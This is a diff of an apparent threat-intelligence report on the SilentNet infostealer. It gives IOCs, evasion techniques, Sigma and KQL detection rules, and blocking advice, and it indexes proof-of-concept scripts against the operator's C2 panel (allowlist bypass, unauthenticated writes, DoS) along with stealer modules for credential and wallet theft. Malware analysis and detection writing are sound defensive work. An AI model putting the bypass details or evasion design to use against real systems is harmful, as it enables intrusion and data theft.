+| `X-Runtime-Env: jre-embedded` | HTTP header | Malware beacon — block outbound |
+| `X-Edge-Cache-Revalidate: stale-if-error` | HTTP header | Malware CDN header |
+| `x-cdn-origin-verify: trusted-upstream` | HTTP header | CDN download header |
 
-This confirms the operator is monitoring the C2 in near real-time and actively developing the malware.
+### Blockchain IOCs
 
-### 403 Bypass Assessment
+| Indicator | Type | Description |
+|---|---|---|
+| `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` | Contract | C2 domain resolver |
+| `0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767` | Wallet | Operator wallet |
+| `0xce6d41de` | Function selector | getDomain() |
+| Polygon mainnet | Network | Chain ID 137 |
 
-The `/auth/login` 403 is enforced by Flask `request.remote_addr` allowlist (not DDoS-Guard), confirmed by:
-- Werkzeug default 403 HTML in response body
-- All proxy header spoofing attempts (X-Forwarded-For, CF-Connecting-IP, True-Client-IP) returned 403
-- `Host: 127.0.0.1` returned 503 from DDoS-Guard backend detection
-- OPTIONS method returned 200 with `Allow: POST, OPTIONS, GET, HEAD` (CORS misconfiguration — no Access-Control-Allow-Origin returned)
+### Cryptographic IOCs
 
-**Conclusion:** The `/auth/login` can only be accessed from the operator allowlisted IP range. The Discord OAuth client_id was not recoverable without accessing the login page HTML.
+| Indicator | Type | Description |
+|---|---|---|
+| `74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7` | Key | Fernet key (all CDN payloads) |
+| `1280ff5f2c4a59e8a9301d8e2eb7c2e9774ec6026a48905c52d23fb1974438bf` | SHA256 | app.pyd (stealer core, all versions) |
+| `52056f4b964f1bc0419064a374a32e56ef85ccb161166971...` | SHA256 | mypyc stage-1 pyd |
+| `50923b458dad653990105637b17227af36cde152cfc1f88c...` | SHA256 | python312.zip |
+
+### File System IOCs
+
+| Path | Description |
+|---|---|
+| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\` | Payload staging directory |
+| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\python.exe` | Portable runtime |
+| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\AppHost\app.pyd` | Stealer core |
+| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\AppHost\main.py` | Launcher |
+| `%TEMP%\_spawn.log` | Stage 1 spawn log |
+
+### Registry IOCs
+
+| Key | Description |
+|---|---|
+| `HKCU\Software\Microsoft\Windows\NtProfileIndex` | Persistence / mutex key |
+
+### Process and Pipe IOCs
+
+| Indicator | Description |
+|---|---|
+| `python.exe` from `%LOCALAPPDATA%\Microsoft\Windows\` | Stealer process |
+| Named pipe `\\.\pipe\NtProfileSync` | DLL injection IPC channel |
+| `javaw.exe -cp ... -restarted` | Stage 1 restart marker |
+
+### Regex IOCs
+
+```
+# CDN payload path
+/cdn/e/[a-f0-9]{12}
+
+# Fernet key in binary constant pool (hex, 64 chars)
+[a-f0-9]{64}
+
+# Polygon contract address
+0x9c0a507300fd902787bb193d80fca5ce6e1bff9a
+
+# Beacon User-Agent
+Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36
+```
+
+---
+
+## Anti-Analysis and Evasion Techniques
+
+| Technique | Implementation |
+|---|---|
+| Multi-layer encryption | AES-128-CBC (JAR) + Fernet (CDN) — two independent keys |
+| Nuitka compilation | Python to native extension — no readable bytecode |
+| mypyc compilation | Type-annotated Python to C — additional obfuscation |
+| Java obfuscation | Short class names, dead code `throw null` anti-decompiler paths |
+| String splitting | C2 URLs split across multiple string constants |
+| Blockchain C2 | Domain on-chain — takedown resistant, no DNS dependency |
+| DNS-over-HTTPS | Cloudflare 1.1.1.1 DoH — bypasses DNS monitoring |
+| Named pipe injection | Avoids `WriteProcessMemory`+`CreateRemoteThread` EDR signatures |
+| Stripped deployment | V1: Python source removed, binary .pyd only |
+| Fernet timestamp rotation | Periodic re-encryption with fresh timestamp |
+| IP allowlist | Admin panel at DDoS-Guard edge — cannot be header-spoofed |
+| Named pipe mutex | Prevents double-execution of stealer |
+
+---
+
+## Defensive Recommendations
+
+### Immediate Actions
+
+1. **Block network IOCs** — `thisisafalsepositive.st`, `185.178.208.191`, `sltnnt.ru` at firewall/DNS
+2. **Monitor Polygon contract** — subscribe to `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` for domain changes
+3. **Block CDN path pattern** — `/cdn/e/[a-f0-9]{12}` at web proxy
+4. **Block beacon headers outbound** — `X-Runtime-Env: jre-embedded` at proxy/firewall
+5. **Scan for staging directory** — `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\`
+6. **Hunt for spawn log** — `%TEMP%\_spawn.log`
+7. **Check named pipe** — `\\.\pipe\NtProfileSync` active on endpoints
+
+### SIEM / EDR Detection Rules
+
+```yaml
+# Sigma — SilentNet Staging Directory
+title: SilentNet Infostealer Staging Directory
+status: stable
+logsource:
+  category: file_event
+  product: windows
+detection:
+  selection:
+    TargetFilename|contains: \Microsoft\Windows\NtProfileIndex\
+  condition: selection
+level: high
+tags: [malware.infostealer, silentnet]
+
+---
+# Sigma — SilentNet Named Pipe
+title: SilentNet DLL Injection Named Pipe
+status: stable
+logsource:
+  category: pipe_created
+  product: windows
+detection:
+  selection:
+    PipeName: NtProfileSync
+  condition: selection
+level: critical
+
+---
+# Sigma — SilentNet Beacon Header
+title: SilentNet C2 Beacon HTTP Header
+status: stable
+logsource:
+  category: proxy
+detection:
+  selection:
+    cs-headers|contains:
+      - "X-Runtime-Env: jre-embedded"
+      - "x-cdn-origin-verify: trusted-upstream"
+  condition: selection
+level: high
+```
+
+### Threat Hunting Queries
+
+```kql
+// KQL — NtProfileIndex staging directory activity
+DeviceFileEvents
+| where FolderPath contains "NtProfileIndex"
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessName
+
+// KQL — python.exe spawned from unusual Windows path
+DeviceProcessEvents
+| where FileName == "python.exe"
+| where FolderPath contains "Microsoft\Windows"
+| where not(FolderPath contains "WindowsApps")
+| project Timestamp, DeviceName, FolderPath, ProcessCommandLine, InitiatingProcessName
+
+// KQL — Polygon RPC outbound (non-browser)
+DeviceNetworkEvents
+| where RemoteUrl has_any ("polygon-rpc.com","llamarpc.com","publicnode.com","1rpc.io","drpc.org")
+| where InitiatingProcessName !in ("chrome.exe","msedge.exe","firefox.exe")
+| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessName
+
+// KQL — Named pipe creation matching SilentNet pattern
+DeviceEvents
+| where ActionType == "NamedPipeEvent"
+| where AdditionalFields contains "NtProfileSync"
+| project Timestamp, DeviceName, InitiatingProcessName, AdditionalFields
+```
+
+---
+
+## Proof-of-Concept Index
+
+See `poc/README.md` for full usage instructions and requirements.
+
+| File | Vulnerability | Title | Impact |
+|---|---|---|---|
+| `poc/poc_01_ip_bypass.py` | VULN-01 | Flask IP Allowlist Bypass | Access all /shard/* from any IP |
+| `poc/poc_02_db_write.py` | VULN-02 | Unauthenticated DB Write | Inject arbitrary entries into victim database |
+| `poc/poc_03_submitlogs_dos.py` | VULN-03 | submitLogs Persistent DoS | 100% crash rate on log submission handler |
+| `poc/poc_04_fernet_decrypt.py` | VULN-05 | Fernet Key Decryption | Decrypt any CDN payload version |
+| `poc/poc_05_static_bypass.py` | VULN-04 | nginx Static File Bypass | Read all panel CSS/JS without auth |
+| `poc/poc_06_blockchain_resolver.py` | VULN-06 | Blockchain C2 Monitor | Real-time C2 domain resolution and monitoring |
+
+---
+
+## Source Files Index
+
+| File | Size | Description |
+|---|---|---|
+| `source/app.py` | 7,962B | Main orchestrator |
+| `source/app_config.py` | 2,756B | Configuration |
+| `source/app_contract.py` | 3,141B | Blockchain C2 interaction |
+| `source/app_crypto.py` | 2,215B | Cryptographic operations |
+| `source/app_handlers.py` | 2,149B | Handler dispatch |
+| `source/app_handlers_browser.py` | 14,646B | Browser credential theft |
+| `source/app_handlers_browser_extensions.py` | 7,714B | Extension wallet extraction |
+| `source/app_handlers_credentials.py` | 9,104B | Credential file harvesting |
+| `source/app_handlers_discord.py` | 6,715B | Discord token theft |
+| `source/app_handlers_files.py` | 4,520B | File exfiltration |
+| `source/app_handlers_firefox.py` | 12,061B | Firefox profile decryption |
+| `source/app_handlers_keywords.py` | 3,963B | Keyword file targeting |
+| `source/app_handlers_minecraft.py` | 5,531B | Minecraft session theft |
+| `source/app_handlers_screenshot.py` | 2,274B | Screen capture |
+| `source/app_handlers_system_info.py` | 4,962B | System enumeration |
+| `source/app_handlers_wallets.py` | 2,360B | Crypto wallet extraction |
+| `source/app_http.py` | 4,440B | HTTP transport layer |
+| `source/app_logging.py` | 2,616B | Internal logging |
+| `source/app_resources.py` | 1,193B | Resource loader |
+| `source/app_resources_browser_module.py` | 1,117B | Browser resource management |
+| `source/app_staging.py` | 9,676B | Download / decrypt / launch |
+| `source/app_trace.py` | 1,290B | Error tracing |
+| `source/app_util.py` | 1,971B | General utilities |
+| `source/app_util_crypto.py` | 2,593B | Crypto utilities |
+| `source/app_util_dll_injection.py` | 3,867B | DLL injection |
+| `source/app_util_file.py` | 1,466B | File system utilities |
+| `source/app_util_handle_copy.py` | 8,993B | Handle duplication |
+| `source/app_util_pipe.py` | 3,117B | Named pipe IPC |
+| `source/app_util_process.py` | 3,500B | Process management |
+| `source/app_util_registry.py` | 1,679B | Registry operations |
+
+---
+
+## Timeline
+
+| Time (UTC) | Event |
+|---|---|
+| 2026-07-20 ~16:19 | Initial sample acquired, Stage 1 JAR analysis begins |
+| 2026-07-20 16:28 | Nuitka constant pool extracted (232KB) |
+| 2026-07-20 16:32 | Stage 2 AES-CBC decryption successful |
+| 2026-07-20 16:34 | Python constant pool unpickled — strings deobfuscated |
+| 2026-07-20 16:44 | Fernet key recovered from constant pool |
+| 2026-07-20 17:28 | All 30 Python modules decompiled and reconstructed |
+| 2026-07-20 17:31 | Polygon smart contract queried — live C2 domain confirmed |
+| 2026-07-20 18:05 | Live CDN payload (V2) downloaded and decrypted — 736 files |
+| 2026-07-20 18:05 | C2 server active scan begins |
+| 2026-07-20 18:30 | nginx static file bypass discovered |
+| 2026-07-20 18:31 | Full panel CSS/JS downloaded — admin UI reconstructed |
+| 2026-07-20 18:38 | V3 payload observed (21.15MB trimmed bundle) |
+| 2026-07-20 18:44 | V1/V2/V3/V4 three-way diff completed |
+| 2026-07-20 18:52 | V4 observed — Fernet timestamp rotation confirmed |
+| 2026-07-20 18:54 | V4 decrypted — byte-for-byte identical to V2 |
+| 2026-07-20 19:00 | X-Runtime-Env header bypass discovered (VULN-01) |
+| 2026-07-20 19:03 | /shard/submitData 200 confirmed (VULN-02) |
+| 2026-07-20 19:07 | /shard/submitLogs persistent 500 confirmed (VULN-03) |
+| 2026-07-20 19:28 | All 7 vulnerabilities documented |
+| 2026-07-20 19:28 | 6 POC scripts written |
+| 2026-07-20 19:32 | README and POC directory complete |
